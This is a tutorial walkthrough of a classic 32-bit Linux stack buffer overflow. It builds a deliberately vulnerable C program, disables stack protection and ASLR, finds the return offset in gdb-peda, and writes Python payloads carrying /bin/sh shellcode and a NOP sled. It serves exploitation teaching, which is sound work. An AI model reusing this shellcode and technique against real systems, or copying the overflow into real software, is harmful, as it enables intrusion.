## Smashing the Stack
**Vulnerable program**

    #include <stdio.h>
    void vuln()
    {
            char buffer[16];
            read(0,buffer,100);
            puts(buffer);
    }
    int main()
    {
            vuln();
    }
**Compiling to vulnerable**
```
gcc -m32 -fno-stack-protector -zexecstack -mpreferred-stack-boundary=2 -o stack_0 stack_0.c
(Note)
*
-fno-stack-protector -> Disable Stack protector  
-zexecstack -> Allow executing stack  
-m32 -> Compile with x86 architecture  
-mpreferred-stack-boundary -> 32 bits on 64 bits stack structure
```
**Disable ASLR**
```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
**Check ASLR**

    root@local:~/Desktop/Stack# ldd ./stack_0
            linux-gate.so.1 (0xf7fd3000)
            libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7db2000)
            /lib/ld-linux.so.2 (0xf7fd5000)
    root@local:~/Desktop/Stack# ldd ./stack_0
            linux-gate.so.1 (0xf7fd3000)
            libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7db2000)
            /lib/ld-linux.so.2 (0xf7fd5000)
    root@local:~/Desktop/Stack# ldd ./stack_0
            linux-gate.so.1 (0xf7fd3000)
            libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7db2000)
            /lib/ld-linux.so.2 (0xf7fd5000)
**Check Security**

    root@local:~/Desktop/Stack# checksec ./stack_0
    [*] '/root/Desktop/Stack/stack_0'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX disabled
        PIE:      PIE enabled
        RWX:      Has RWX segments
**Detect Buffer Overflow**

    root@local:~/Desktop/Stack# ./stack_0
    Hello
    Hello
    ▒▒
    root@local:~/Desktop/Stack# ./stack_0
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
            ▒▒
    Segmentation fault
**Debugging Overflow**

    root@local:~/Desktop/Stack# gdb -q ./stack_0
    Reading symbols from ./stack_0...(no debugging symbols found)...done.
    gdb-peda$ disas main
    Dump of assembler code for function main:
       0x000011ed <+0>:     push   ebp
       0x000011ee <+1>:     mov    ebp,esp
       0x000011f0 <+3>:     call   0x1206 <__x86.get_pc_thunk.ax>
       0x000011f5 <+8>:     add    eax,0x2e0b
       0x000011fa <+13>:    call   0x11b9 <vuln>
       0x000011ff <+18>:    mov    eax,0x0
       0x00001204 <+23>:    pop    ebp
       0x00001205 <+24>:    ret
    End of assembler dump.
    gdb-peda$ disas vuln
    Dump of assembler code for function vuln:
       0x000011b9 <+0>:     push   ebp
       0x000011ba <+1>:     mov    ebp,esp
       0x000011bc <+3>:     push   ebx
       0x000011bd <+4>:     sub    esp,0x10
       0x000011c0 <+7>:     call   0x10c0 <__x86.get_pc_thunk.bx>
       0x000011c5 <+12>:    add    ebx,0x2e3b
       0x000011cb <+18>:    push   0x64
       0x000011cd <+20>:    lea    eax,[ebp-0x14]
       0x000011d0 <+23>:    push   eax
       0x000011d1 <+24>:    push   0x0
       0x000011d3 <+26>:    call   0x1040 <read@plt>
       0x000011d8 <+31>:    add    esp,0xc
       0x000011db <+34>:    lea    eax,[ebp-0x14]
       0x000011de <+37>:    push   eax
       0x000011df <+38>:    call   0x1050 <puts@plt>
       0x000011e4 <+43>:    add    esp,0x4
       0x000011e7 <+46>:    nop
       0x000011e8 <+47>:    mov    ebx,DWORD PTR [ebp-0x4]
       0x000011eb <+50>:    leave
       0x000011ec <+51>:    ret
    End of assembler dump.
Break and see what happened

    gdb-peda$ b *vuln+38
    Breakpoint 1 at 0x11df
    gdb-peda$ run
    Starting program: /root/Desktop/Stack/stack_0
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    [----------------------------------registers-----------------------------------]
    EAX: 0xffffd62c ('A' <repeats 34 times>, "\n\367\001")
    EBX: 0x56559000 --> 0x3efc
    ECX: 0xffffd62c ('A' <repeats 34 times>, "\n\367\001")
    EDX: 0x64 ('d')
    ESI: 0xf7f8d000 --> 0x1d5d8c
    EDI: 0x0
    EBP: 0xffffd640 ('A' <repeats 14 times>, "\n\367\001")
    ESP: 0xffffd628 --> 0xffffd62c ('A' <repeats 34 times>, "\n\367\001")
    EIP: 0x565561df (<vuln+38>:     call   0x56556050 <puts@plt>)
    EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
       0x565561d8 <vuln+31>:        add    esp,0xc
       0x565561db <vuln+34>:        lea    eax,[ebp-0x14]
       0x565561de <vuln+37>:        push   eax
    => 0x565561df <vuln+38>:        call   0x56556050 <puts@plt>
       0x565561e4 <vuln+43>:        add    esp,0x4
       0x565561e7 <vuln+46>:        nop
       0x565561e8 <vuln+47>:        mov    ebx,DWORD PTR [ebp-0x4]
       0x565561eb <vuln+50>:        leave
    Guessed arguments:
    arg[0]: 0xffffd62c ('A' <repeats 34 times>, "\n\367\001")
    [------------------------------------stack-------------------------------------]
    0000| 0xffffd628 --> 0xffffd62c ('A' <repeats 34 times>, "\n\367\001")
    0004| 0xffffd62c ('A' <repeats 34 times>, "\n\367\001")
    0008| 0xffffd630 ('A' <repeats 30 times>, "\n\367\001")
    0012| 0xffffd634 ('A' <repeats 26 times>, "\n\367\001")
    0016| 0xffffd638 ('A' <repeats 22 times>, "\n\367\001")
    0020| 0xffffd63c ('A' <repeats 18 times>, "\n\367\001")
    0024| 0xffffd640 ('A' <repeats 14 times>, "\n\367\001")
    0028| 0xffffd644 ("AAAAAAAAAA\n\367\001")
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    
    Breakpoint 1, 0x565561df in vuln ()
Run to ret and see top of the stack

    gdb-peda$
    [----------------------------------registers-----------------------------------]
    EAX: 0x26 ('&')
    EBX: 0x41414141 ('AAAA')
    ECX: 0x5655a160 --> 0x410a01f7
    EDX: 0xf7f8e890 --> 0x0
    ESI: 0xf7f8d000 --> 0x1d5d8c
    EDI: 0x0
    EBP: 0x41414141 ('AAAA')
    ESP: 0xffffd644 ("AAAAAAAAAA\n\367\001")
    EIP: 0x565561ec (<vuln+51>:     ret)
    EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
       0x565561e7 <vuln+46>:        nop
       0x565561e8 <vuln+47>:        mov    ebx,DWORD PTR [ebp-0x4]
       0x565561eb <vuln+50>:        leave
    => 0x565561ec <vuln+51>:        ret
       0x565561ed <main>:   push   ebp
       0x565561ee <main+1>: mov    ebp,esp
       0x565561f0 <main+3>: call   0x56556206 <__x86.get_pc_thunk.ax>
       0x565561f5 <main+8>: add    eax,0x2e0b
    [------------------------------------stack-------------------------------------]
    0000| 0xffffd644 ("AAAAAAAAAA\n\367\001")
    0004| 0xffffd648 ("AAAAAA\n\367\001")
    0008| 0xffffd64c --> 0xf70a4141
    0012| 0xffffd650 --> 0x1
    0016| 0xffffd654 --> 0xffffd6e4 --> 0xffffd810 ("/root/Desktop/Stack/stack_0")
    0020| 0xffffd658 --> 0xffffd6ec --> 0xffffd82c ("LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...)
    0024| 0xffffd65c --> 0xffffd674 --> 0x0
    0028| 0xffffd660 --> 0x1
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    0x565561ec in vuln ()
After ret , see crash

    gdb-peda$ ni
    [----------------------------------registers-----------------------------------]
    EAX: 0x26 ('&')
    EBX: 0x41414141 ('AAAA')
    ECX: 0x5655a160 --> 0x410a01f7
    EDX: 0xf7f8e890 --> 0x0
    ESI: 0xf7f8d000 --> 0x1d5d8c
    EDI: 0x0
    EBP: 0x41414141 ('AAAA')
    ESP: 0xffffd648 ("AAAAAA\n\367\001")
    EIP: 0x41414141 ('AAAA')
    EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
    Invalid $PC address: 0x41414141
    [------------------------------------stack-------------------------------------]
    0000| 0xffffd648 ("AAAAAA\n\367\001")
    0004| 0xffffd64c --> 0xf70a4141
    0008| 0xffffd650 --> 0x1
    0012| 0xffffd654 --> 0xffffd6e4 --> 0xffffd810 ("/root/Desktop/Stack/stack_0")
    0016| 0xffffd658 --> 0xffffd6ec --> 0xffffd82c ("LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc"...)
    0020| 0xffffd65c --> 0xffffd674 --> 0x0
    0024| 0xffffd660 --> 0x1
    0028| 0xffffd664 --> 0x0
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    0x41414141 in ?? ()
**Calculating Crash point**

    gdb-peda$ pattern_create 100
    'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
delete breakpoints

    gdb-peda$ del 1
    gdb-peda$ info b
    No breakpoints or watchpoints.
and run again with pattern

    gdb-peda$ run
    Starting program: /root/Desktop/Stack/stack_0
    AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
    AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
    
    Program received signal SIGSEGV, Segmentation fault.
    [----------------------------------registers-----------------------------------]
    EAX: 0x65 ('e')
    EBX: 0x41434141 ('AACA')
    ECX: 0x5655a160 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
    EDX: 0xf7f8e890 --> 0x0
    ESI: 0xf7f8d000 --> 0x1d5d8c
    EDI: 0x0
    EBP: 0x41412d41 ('A-AA')
    ESP: 0xffffd648 ("AA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
    EIP: 0x44414128 ('(AAD')
    EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
    Invalid $PC address: 0x44414128
    [------------------------------------stack-------------------------------------]
    0000| 0xffffd648 ("AA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
    0004| 0xffffd64c ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
    0008| 0xffffd650 ("EAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
    0012| 0xffffd654 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
    0016| 0xffffd658 ("AFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
    0020| 0xffffd65c ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
    0024| 0xffffd660 ("AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
    0028| 0xffffd664 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    Stopped reason: SIGSEGV
    0x44414128 in ?? ()
Calcaulate offset

    gdb-peda$ pattern_offset 0x44414128
    1145127208 found at offset: 24
Manually calculate
we have seen `lea eax,[ebp-0x14]`
0x14 = 20 in hexadecimal
20 + 4 ( saved ebp ) = 24

**Landing Shellcode**
Generating to payload_0.txt

    root@local:~/Desktop/Stack# python -c 'print "A"*24+"BBBB"+"C"*50' > payload_0.txt
run in gdb using payload_0

    root@local:~/Desktop/Stack# gdb -q ./stack_0
    Reading symbols from ./stack_0...(no debugging symbols found)...done.
    gdb-peda$ r < payload_0.txt
    Starting program: /root/Desktop/Stack/stack_0 < payload_0.txt
    AAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
    ▒
    
    Program received signal SIGSEGV, Segmentation fault.
    [----------------------------------registers-----------------------------------]
    EAX: 0x51 ('Q')
    EBX: 0x41414141 ('AAAA')
    ECX: 0x5655a160 --> 0x41410af7
    EDX: 0xf7f8e890 --> 0x0
    ESI: 0xf7f8d000 --> 0x1d5d8c
    EDI: 0x0
    EBP: 0x41414141 ('AAAA')
    ESP: 0xffffd648 ('C' <repeats 50 times>, <incomplete sequence \367>)
    EIP: 0x42424242 ('BBBB')
    EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
    Invalid $PC address: 0x42424242
    [------------------------------------stack-------------------------------------]
    0000| 0xffffd648 ('C' <repeats 50 times>, <incomplete sequence \367>)
    0004| 0xffffd64c ('C' <repeats 46 times>, <incomplete sequence \367>)
    0008| 0xffffd650 ('C' <repeats 42 times>, <incomplete sequence \367>)
    0012| 0xffffd654 ('C' <repeats 38 times>, <incomplete sequence \367>)
    0016| 0xffffd658 ('C' <repeats 34 times>, <incomplete sequence \367>)
    0020| 0xffffd65c ('C' <repeats 30 times>, <incomplete sequence \367>)
    0024| 0xffffd660 ('C' <repeats 26 times>, <incomplete sequence \367>)
    0028| 0xffffd664 ('C' <repeats 22 times>, <incomplete sequence \367>)
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    Stopped reason: SIGSEGV
    0x42424242 in ?? ()
We controlled eip in with 42424242 & 43 ( C ) values are landing on the stack. 
What is esp address ? `0xffffd648`
Let's go back to the stack and Inject shell code in C.

Aleph One's Shell code from phrack magazine

    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"

Putting it all together

    root@local:~/Desktop/Stack# python -c 'print "A"*24+"\x48\xd6\xff\xff"+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"' > payload_0.txt

Run with shellcode

    gdb-peda$ r < payload_0.txt
    Starting program: /root/Desktop/Stack/stack_0 < payload_0.txt
    AAAAAAAAAAAAAAAAAAAAAAAAH▒▒▒▒^▒1▒F▒F
    ▒
     ▒▒▒V
    1ۉ▒@̀▒▒▒▒▒/bin/sh
    
    process 18890 is executing new program: /bin/dash
    [Inferior 1 (process 18890) exited normally]
    Warning: not running or target is remote
We spawn a shell inside gdb right? What about outside of the gdb?

    root@local:~/Desktop/Stack# cat payload_0.txt | ./stack_0
    AAAAAAAAAAAAAAAAAAAAAAAAH▒▒▒▒^▒1▒F▒F
    ▒
     ▒▒▒V
    1ۉ▒@̀▒▒▒▒▒/bin/sh
    
    Segmentation fault
**NOP Trick for shellcode reliable**
We will add \x90 * 40 

we need to edit our eip 

ffffd648+0x14 (20) = ffffd65c

New payload

    root@local:~/Desktop/Stack# python -c 'print "A"*24+"\x5c\xd6\xff\xff"+"\x90"*40+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"' > payload_0.txt

Not work again :-( 
Let's analyze core dump with gdb for why?

**Analyze core dump file**
`ulimit -c unlimited`
When we run payload again , core file dumped.

    root@local:~/Desktop/Stack# cat payload_0.txt | ./stack_0
    AAAAAAAAAAAAAAAAAAAAAAAA\▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒^▒1▒F▒F
    ▒
     ▒▒▒V
    1ۉ▒@▒
    Segmentation fault (core dumped)
launch gdb with core file

    root@local:~/Desktop/Stack# gdb -q stack_0 core
    Reading symbols from stack_0...(no debugging symbols found)...done.
    [New LWP 19027]
    Core was generated by `./stack_0'.
    Program terminated with signal SIGSEGV, Segmentation fault.
    #0  0xffffd65c in ?? ()
what about our eip?

    gdb-peda$ x/8x $eip
    0xffffd65c:     0x00000000      0xffffd680      0x565561e4      0xffffd66c
    0xffffd66c:     0x41414141      0x41414141      0x41414141      0x41414141

Oh ! its `0x00000000` ? What the hell ? Where is the NOP and shellcode?

    gdb-peda$ x/32x $eip+0x14
    0xffffd670:     0x41414141      0x41414141      0x41414141      0x41414141
    0xffffd680:     0x41414141      0xffffd65c      0x90909090      0x90909090
    0xffffd690:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd6a0:     0x90909090      0x90909090      0x90909090      0x90909090
    0xffffd6b0:     0x895e1feb      0xc0310876      0x89074688      0x0bb00c46
    0xffffd6c0:     0x4e8df389      0x0c568d08      0xdb3180cd      0xcd40d889
    0xffffd6d0:     0x00000000      0x00000000      0x00000001      0x56556080
    0xffffd6e0:     0x00000000      0xf7fea350      0xf7fe4f60      0x56559000
We can see the stack address is changed from outside of gdb. If we use `
0xffffd6a0` as new eip , it will go to shellcode.
 It also not work in my machine.
**Changing Shellcode**

    python -c 'print "A"*24+"\x9c\xd6\xff\xff"+"\x90"*40+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"' > payload_0.txt
I changed shellcode form [this](http://shell-storm.org/shellcode/files/shellcode-811.php)

    root@local:~/Desktop/Stack# cat payload_0.txt | ./stack_0                       AAAAAAAAAAAAAAAAAAAAAAAA▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒1▒Ph//shh/bin▒▒▒°
         ̀1▒@̀

**Exercises**
protostar stack exercises

**Further Reading**
http://phrack.org/issues/49/14.html

Shell coder Handbook

Hacking : The art of exploitation

**Inspiration**
https://exploit.courses/#/challenge/11

https://github.com/nnamon/linux-exploitation-course/blob/master/lessons/4_classic_exploitation/lessonplan.md

